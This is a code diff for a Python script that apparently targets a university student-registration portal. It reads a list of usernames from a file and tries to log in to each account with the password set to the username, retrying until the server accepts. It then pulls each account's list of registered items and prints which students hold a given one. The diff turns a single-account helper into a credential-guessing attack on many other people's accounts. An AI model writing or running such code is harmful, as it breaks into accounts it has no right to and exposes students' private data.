@@ -3,6 +3,7 @@ import os
 import sys
 from scrapy import Selector
 from pprint import pprint
+from alive_progress import alive_bar
 
 # # debug
 # import logging
@@ -44,44 +45,30 @@ post_header = {
     "X-Requested-With": "XMLHttpRequest",
 }
 
-# names = [e.strip() for e in open('../daotao/out.txt').readlines()]
+names = [e.strip() for e in open('../daotao/out.txt').readlines()]
 
-# for username in names:
-#     status_code = 503
-#     try:
-#         ses = requests.Session()
-#         requests.utils.add_dict_to_cookiejar(ses.cookies, cookies)
-#         form_body['LoginName'] = username
-#         form_body['Password'] = username
-#         while status_code != 200:
-#             response = ses.post(URL_LOGIN, data=form_body,
-#                                 headers=headers, cookies=cookies)
-#             status_code = response.status_code
-#         status_code = 503
+with alive_bar(len(names), enrich_print=False) as bar:
+    for username in names:
+        status_code = 503
+        try:
+            ses = requests.Session()
+            requests.utils.add_dict_to_cookiejar(ses.cookies, cookies)
+            form_body['LoginName'] = username
+            form_body['Password'] = username
+            while status_code != 200:
+                response = ses.post(URL_LOGIN, data=form_body,
+                                    headers=headers, cookies=cookies)
+                status_code = response.status_code
+            status_code = 503
 
-#         while status_code != 200:
-#             response = ses.post(URL_LIST_REGISTERED, headers=post_header)
-#             status_code = response.status_code
+            while status_code != 200:
+                response = ses.post(URL_LIST_REGISTERED, headers=post_header)
+                status_code = response.status_code
+            if sys.argv[1] in response.text:
+                print(username + ' has ' + sys.argv[1])
+            bar()
 
-#         if sys.argv[1] in response.text:
-#             print(username + ' has ' + sys.argv[1])
-
-#     except requests.exceptions.ConnectionError:
-#         continue
-
-status_code = 503
-ses = requests.Session()
-requests.utils.add_dict_to_cookiejar(ses.cookies, cookies)
-form_body['LoginName'] = os.environ['UET_USER']
-form_body['Password'] = os.environ['UET_PASS']
-while status_code != 200:
-    response = ses.post(URL_LOGIN, data=form_body,
-                        headers=headers, cookies=cookies)
-    status_code = response.status_code
-status_code = 503
-
-while status_code != 200:
-    response = ses.post(URL_LIST_REGISTERED, headers=post_header)
-    status_code = response.status_code
-
-print(response.text)
+        except KeyboardInterrupt:
+            break
+        except requests.exceptions.ConnectionError:
+            continue
